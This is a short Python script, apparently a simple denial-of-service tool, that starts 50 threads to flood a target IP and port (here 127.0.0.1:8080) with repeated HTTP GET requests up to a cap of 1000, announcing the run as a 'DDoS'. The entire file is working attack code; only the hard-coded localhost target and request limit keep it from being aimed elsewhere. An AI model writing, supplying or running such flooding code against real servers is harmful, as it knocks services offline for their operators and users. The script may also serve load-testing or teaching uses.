import socket
import threading

def dos():
    target_ip = '127.0.0.1' 
    target_port = 8080 
    request_counter = 0
    max_requests = 1000 

    def attack():
        nonlocal request_counter
        while request_counter < max_requests:
            try:
                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                s.connect((target_ip, target_port))
                s.send(f"GET / HTTP/1.1\r\nHost: {target_ip}\r\n\r\n".encode())
                s.recv(1024)
                s.close()

                request_counter += 1
                print(f"Request {request_counter} sent")
            except (socket.timeout, socket.error) as e:
                print(f"Error: {e}")

    print(f"Starting DDoS on {target_ip}:{target_port}...")
    print("Press Ctrl+C to stop.")
    threads = []
    for i in range(50):
        thread = threading.Thread(target=attack)
        thread.start()
        threads.append(thread)

    try:
        for thread in threads:
            thread.join()
        print(f"Attack complete. Total requests sent: {request_counter}")
    except KeyboardInterrupt:
        print("Attack stopped.")

print(dos())